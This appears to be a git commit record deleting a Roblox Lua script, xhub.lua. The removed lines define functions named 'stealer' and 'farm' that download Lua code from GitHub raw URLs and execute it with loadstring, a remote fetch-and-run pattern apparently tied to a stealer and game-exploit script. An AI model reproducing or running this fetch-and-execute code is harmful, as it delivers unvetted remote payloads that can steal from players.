c3d3093ee30ec4fd69436e989b0a18d54295bf8a
Zap Hub <anishgiri528@gmail.com>
2025-05-19 12:13:49 +0545

    Delete xhub.lua

--- xhub.lua
+++
@@ -1,9 +0,0 @@
-local function stealer()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Azura83/MuderMystery2/refs/heads/main/azurafinalsource.lua'))()
-end
-local function farm()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2'))()
-end
-
-task.spawn(stealer)
-task.spawn(farm)
